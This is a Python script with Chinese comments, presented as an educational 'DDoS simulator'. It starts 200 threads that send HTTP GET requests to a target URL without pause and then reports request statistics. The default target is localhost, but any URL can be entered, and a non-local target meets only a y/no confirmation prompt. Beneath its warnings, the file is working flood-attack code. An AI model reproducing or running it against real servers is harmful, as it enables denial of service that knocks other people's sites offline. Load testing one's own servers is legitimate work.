"""
DDoS 模擬腳本
警告: 僅用於教育目的和本地測試
切勿用於攻擊真實伺服器,否則將違反法律
"""
import requests
import threading
import time
from queue import Queue

class DDoSSimulator:
    def __init__(self, target_url, num_threads=200, duration=30):
        """
        初始化 DDoS 模擬器
        
        參數:
            target_url: 目標URL (應該是本地測試伺服器)
            num_threads: 並發線程數
            duration: 攻擊持續時間(秒)
        """
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = duration
        self.request_count = 0
        self.error_count = 0
        self.lock = threading.Lock()
        self.running = True
        
    def send_request(self):
        """發送單個HTTP請求"""
        while self.running:
            try:
                response = requests.get(self.target_url, timeout=2)
                with self.lock:
                    self.request_count += 1
                    if self.request_count % 200 == 0:
                        print(f"已發送 {self.request_count} 個請求")
            except Exception as e:
                with self.lock:
                    self.error_count += 1
            # 無延遲,持續發送請求
    
    def worker(self):
        """工作線程"""
        self.send_request()
    
    def start_attack(self):
        """開始模擬攻擊"""
        print(f"=" * 60)
        print(f"DDoS 模擬測試開始")
        print(f"目標: {self.target_url}")
        print(f"線程數: {self.num_threads}")
        print(f"持續時間: {self.duration} 秒")
        print(f"=" * 60)
        
        # 確認是否為本地伺服器
        if "127.0.0.1" not in self.target_url and "localhost" not in self.target_url:
            print("警告: 目標不是本地伺服器!")
            confirm = input("確定要繼續嗎? (y/no): ")
            if confirm.lower() != 'y':
                print("已取消")
                return
        
        start_time = time.time()
        
        # 創建並啟動線程
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 運行指定時間
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print("\n收到中斷信號")
        
        # 停止所有線程
        self.running = False
        print("\n正在停止線程...")
        time.sleep(2)
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        # 顯示統計資訊
        print(f"\n" + "=" * 60)
        print(f"測試完成")
        print(f"=" * 60)
        print(f"總請求數: {self.request_count}")
        print(f"錯誤數: {self.error_count}")
        print(f"成功率: {(self.request_count / (self.request_count + self.error_count) * 100):.2f}%")
        print(f"持續時間: {elapsed_time:.2f} 秒")
        print(f"平均請求速率: {self.request_count / elapsed_time:.2f} 請求/秒")
        print(f"=" * 60)

def main():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║          DDoS 模擬器 - 僅供教育用途                    ║
    ║                                                          ║
    ║  警告: 未經授權對他人伺服器進行攻擊是違法行為          ║
    ║        本工具僅用於測試自己的本地伺服器                ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    # 配置參數
    target_url = "http://127.0.0.1:8000"  # 本地測試伺服器
    num_threads = 200  # 並發線程數
    duration = 30  # 持續時間(秒)
    
    print(f"預設設定:")
    print(f"  目標URL: {target_url}")
    print(f"  線程數: {num_threads}")
    print(f"  持續時間: {duration} 秒\n")
    
    use_default = input("使用預設設定? (y/no): ")
    
    if use_default.lower() != 'y':
        target_url = input("輸入目標URL (預設: http://127.0.0.1:8000): ") or target_url
        try:
            num_threads = int(input(f"輸入線程數 (預設: {num_threads}): ") or num_threads)
            duration = int(input(f"輸入持續時間(秒) (預設: {duration}): ") or duration)
        except ValueError:
            print("輸入無效,使用預設值")
    
    # 創建模擬器並開始測試
    simulator = DDoSSimulator(target_url, num_threads, duration)
    simulator.start_attack()

if __name__ == '__main__':
    main()
